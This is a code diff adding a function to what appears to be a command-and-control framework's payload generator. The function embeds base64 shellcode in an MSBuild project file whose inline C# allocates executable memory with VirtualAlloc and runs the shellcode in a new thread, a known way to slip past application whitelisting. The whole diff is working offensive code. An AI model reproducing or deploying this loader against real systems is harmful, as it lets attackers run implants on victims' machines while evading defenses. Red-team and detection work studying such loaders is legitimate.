@@ -483,3 +483,51 @@ End Sub
     output_file = open(filename, 'w')
     output_file.write(macro)
     output_file.close()
+
+  def CreateMsbuild(self, name=""):
+    x86filename = "%s%s" % (self.BaseDirectory,name+"Posh-shellcode_x86.bin")
+    x64filename = "%s%s" % (self.BaseDirectory,name+"Posh-shellcode_x64.bin")
+    with open(x86filename, "rb") as b86:
+      x86base64 = base64.b64encode(b86.read())
+    with open(x64filename, "rb") as b64:
+      x64base64 = base64.b64encode(b64.read())  
+    projname = randomuri()
+
+    msbuild="""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+ <Target Name="%s">
+ <%s />
+ </Target>
+ <UsingTask
+ TaskName="%s"
+ TaskFactory="CodeTaskFactory"
+ AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
+ <Task>
+ <Code Type="Class" Language="cs">
+ <![CDATA[
+using System;using System.Runtime.InteropServices;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;
+public class %s : Task, ITask
+{
+private static UInt32 MEM_COMMIT = 0x1000;private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+[DllImport("kernel32")]private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 lpThreadAttributes,UInt32 dwStackSize,UInt32 lpStartAddress,IntPtr param,UInt32 dwCreationFlags,ref UInt32 lpThreadId);
+[DllImport("kernel32")]private static extern UInt32 WaitForSingleObject(IntPtr hHandle,UInt32 dwMilliseconds);
+public override bool Execute()
+{
+string pw = "%s";
+string sc32 = "%s";
+string sc64 = "%s";
+byte[] sc = null;
+if (IntPtr.Size == 4){sc = System.Convert.FromBase64String(sc32);} else {sc = System.Convert.FromBase64String(sc64);}
+
+UInt32 funcAddr = VirtualAlloc(0, (UInt32)sc.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(sc, 0, (IntPtr)(funcAddr), sc.Length);IntPtr hThread = IntPtr.Zero;UInt32 threadId = 0;IntPtr pinfo = IntPtr.Zero;hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);WaitForSingleObject(hThread, 0xFFFFFFFF);return true;}}
+ ]]>
+ </Code>
+ </Task>
+ </UsingTask>
+ </Project>
+""" % (projname,projname,projname,projname,projname,x86base64,x64base64)
+    self.QuickstartLog( "Msbuild file written to: %s%smsbuild.xml" % (self.BaseDirectory,name) )
+    filename = "%s%smsbuild.xml" % (self.BaseDirectory,name)
+    output_file = open(filename, 'w')
+    output_file.write(msbuild)
+    output_file.close()
